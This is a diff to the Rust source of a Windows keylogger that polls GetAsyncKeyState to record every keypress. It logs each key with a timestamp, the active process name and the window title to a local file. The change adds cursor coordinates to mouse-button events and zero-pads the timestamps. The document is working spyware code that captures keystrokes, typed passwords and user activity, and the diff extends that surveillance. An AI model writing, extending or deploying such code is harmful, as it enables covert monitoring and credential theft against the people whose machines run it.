@@ -70,7 +70,7 @@ fn run(file: &mut File) {
             let key = unsafe { GetAsyncKeyState(i) };
 
             if (key & 1) > 0 {
-                let s = format!("[{}:{}:{:02}][{}][{}][{}]\n",
+                let s = format!("[{:02}:{:02}:{:02}][{}][{}][{}]\n",
                                 now.hour(), now.minute(), now.second(),
                                 filename.trim(), title.trim(), keycode_to_string(i as u8));
 
@@ -93,12 +93,12 @@ fn keycode_to_string(k: u8) -> String {
     }
 
     match k {
-        0x01 => { "VK_LBUTTON".to_string() }
-        0x02 => { "VK_RBUTTON".to_string() }
+        0x01 => { format!("VK_LBUTTON:{}", get_mouse_pos()) }
+        0x02 => { format!("VK_RBUTTON:{}", get_mouse_pos()) }
         0x03 => { "VK_CANCEL".to_string() }
-        0x04 => { "VK_MBUTTON".to_string() }
-        0x05 => { "VK_XBUTTON1".to_string() }
-        0x06 => { "VK_XBUTTON2".to_string() }
+        0x04 => { format!("VK_MBUTTON:{}", get_mouse_pos()) }
+        0x05 => { format!("VK_XBUTTON1:{}", get_mouse_pos()) }
+        0x06 => { format!("VK_XBUTTON2:{}", get_mouse_pos()) }
         0x08 => { "VK_BACK".to_string() }
         0x09 => { "VK_TAB".to_string() }
         0x0C => { "VK_CLEAR".to_string() }
@@ -231,6 +231,19 @@ fn keycode_to_string(k: u8) -> String {
     }
 }
 
+fn get_mouse_pos() -> String {
+    use winapi::um::winuser::*;
+    use winapi::shared::windef::POINT;
+
+    let pos = unsafe {
+        let mut p: POINT = std::mem::zeroed();
+        GetCursorPos(&mut p);
+        p
+    };
+
+    format!("{},{}", pos.x, pos.y)
+}
+
 #[cfg(not(windows))]
 fn run(file: &mut File) {
     file.write("Can't use this windows based keylogger".as_bytes());
@@ -238,7 +251,7 @@ fn run(file: &mut File) {
 
 fn main() {
     let now: DateTime<Utc> = Utc::now();
-    let filename = format!("log-{}-{}+{}+{}.log", now.date(), now.hour(), now.minute(), now.second());
+    let filename = format!("log-{}-{:02}+{:02}+{:02}.log", now.date(), now.hour(), now.minute(), now.second());
 
     let mut output = {
         match OpenOptions::new().write(true).create(true).open(&filename) {
